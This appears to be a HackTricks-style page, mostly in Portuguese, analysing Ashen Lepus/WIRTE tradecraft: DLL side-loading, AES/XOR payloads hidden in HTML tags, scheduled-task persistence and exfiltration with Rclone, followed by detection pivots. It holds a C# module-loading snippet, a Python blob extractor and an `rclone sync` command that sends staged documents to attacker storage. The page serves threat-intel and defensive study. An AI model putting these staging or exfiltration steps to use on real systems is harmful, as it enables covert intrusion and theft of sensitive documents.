# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) instrumentalizou um padrão repetível que encadeia DLL sideloading, staged HTML payloads e modular .NET backdoors para persistir em redes diplomáticas do Oriente Médio. A técnica é reutilizável por qualquer operador porque depende de:

- **Archive-based social engineering**: PDFs benignos instruem os alvos a baixar um arquivo RAR de um site de compartilhamento de arquivos. O arquivo compactado contém um visualizador de documentos EXE com aparência legítima, uma DLL maliciosa nomeada como uma biblioteca confiável (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), e um isca `Document.pdf`.
- **DLL search order abuse**: a vítima dá duplo-clique no EXE, Windows resolve a importação da DLL a partir do diretório atual, e o loader malicioso (AshenLoader) é executado dentro do processo confiável enquanto o PDF isca abre para evitar suspeitas.
- **Living-off-the-land staging**: cada estágio posterior (AshenStager → AshenOrchestrator → modules) é mantido fora do disco até ser necessário, entregue como blobs criptografados escondidos dentro de respostas HTML aparentemente inofensivas.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: o EXE side-loads o AshenLoader, que realiza host recon, criptografa-o com AES-CTR e o envia via POST dentro de parâmetros rotativos como `token=`, `id=`, `q=`, ou `auth=` para caminhos com aparência de API (e.g., `/api/v2/account`).
2. **HTML extraction**: o C2 somente entrega o próximo estágio quando o IP do cliente geolocaliza para a região alvo e o `User-Agent` corresponde ao implant, frustrando sandboxes. Quando as verificações passam, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload AshenStager criptografado em Base64/AES-CTR.
3. **Second sideload**: AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML, desta vez esculpindo `<article>...</article>` para recuperar o AshenOrchestrator.
4. **AshenOrchestrator**: um controlador modular .NET que decodifica uma config JSON em Base64. Os campos `tg` e `au` da config são concatenados/hasheados para formar a chave AES, que descriptografa `xrk`. Os bytes resultantes atuam como chave XOR para cada blob de módulo buscado em seguida.
5. **Module delivery**: cada módulo é descrito através de comentários HTML que redirecionam o parser para uma tag arbitrária, quebrando regras estáticas que procuram apenas por `<headerp>` ou `<article>`. Os módulos incluem persistência (`PR*`), desinstaladores (`UN*`), reconhecimento (`SN`), captura de tela (`SCT`) e exploração de arquivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.

### Auxiliar Rápido de Extração (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de Evasão de Staging em HTML

Pesquisas recentes sobre HTML smuggling (Talos) destacam payloads ocultos como strings Base64 dentro de blocos `<script>` em anexos HTML e decodificados via JavaScript em tempo de execução. O mesmo artifício pode ser reaproveitado para respostas C2: stage blobs criptografados dentro de uma tag script (ou outro elemento DOM) e decodificá-los em memória antes de AES/XOR, fazendo a página parecer HTML comum.

## Endurecimento de Crypto & C2

- **AES-CTR everywhere**: os loaders atuais embutem chaves de 256 bits mais nonces (e.g., `{9a 20 51 98 ...}`) e opcionalmente adicionam uma camada XOR usando strings como `msasn1.dll` antes/depois da decriptação.
- **Infrastructure split + subdomain camouflage**: servidores de staging são separados por ferramenta, hospedados em ASNs variados e, às vezes, encobertos por subdomínios com aparência legítima, de modo que burning one stage não expõe o resto.
- **Recon smuggling**: os dados enumerados agora incluem listagens de Program Files para identificar apps de alto valor e são sempre criptografados antes de saírem do host.
- **URI churn**: parâmetros de query e paths REST rotacionam entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **Gated delivery**: servidores são geo-fenced e só respondem a implants reais. Clientes não aprovados recebem HTML não suspeito.

## Persistência & Loop de Execução

AshenStager drops scheduled tasks que se mascaram como jobs de manutenção do Windows e executam via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tasks relançam a cadeia de sideloading na inicialização ou em intervalos, garantindo que AshenOrchestrator possa requisitar módulos novos sem tocar no disco novamente.

## Usando Clientes de Sincronização Benignos para Exfiltração

Operadores stage documentos diplomáticos dentro de `C:\Users\Public` (legíveis por todos e não-suspeitos) através de um módulo dedicado, então baixam o binário legítimo do [Rclone](https://rclone.org/) para sincronizar esse diretório com o armazenamento do atacante. A Unit42 observa que é a primeira vez que esse ator foi visto usando Rclone para exfiltração, alinhando-se com a tendência mais ampla de abusar de ferramentas legítimas de sync para misturar o tráfego com backups normais:

1. **Stage**: copy/collect arquivos alvo para `C:\Users\Public\{campaign}\`.
2. **Configure**: enviar um Rclone config apontando para um endpoint HTTPS controlado pelo atacante (e.g., `api.technology-system[.]com`).
3. **Sync**: executar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que o tráfego se assemelhe a backups em nuvem normais.

Como o Rclone é amplamente usado em fluxos legítimos de backup, os defensores devem focar em execuções anômalas (novos binários, remotes estranhos ou sincronização repentina de `C:\Users\Public`).

## Pivôs de Detecção

- Alertar sobre **signed processes** que inesperadamente carregam DLLs de caminhos graváveis por usuários (filtros Procmon + `Get-ProcessMitigation -Module`), especialmente quando os nomes de DLL coincidem com `netutils`, `srvcli`, `dwampi` ou `wtsapi32`.
- Inspecionar respostas HTTPS suspeitas por **grandes blobs Base64 embutidos dentro de tags incomuns** ou protegidos por comentários `<!-- TAG: <xyz> -->`.
- Estender a caça em HTML para **strings Base64 dentro de blocos `<script>`** (staging estilo HTML smuggling) que são decodificadas via JavaScript antes do processamento AES/XOR.
- Buscar por **scheduled tasks** que executem `svchost.exe` com argumentos não relacionados a serviços ou que apontem de volta para diretórios de dropper.
- Monitorar por binários **Rclone** aparecendo fora de locais gerenciados pelo TI, novos arquivos `rclone.conf` ou jobs de sync puxando de diretórios de staging como `C:\Users\Public`.

## Referências

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
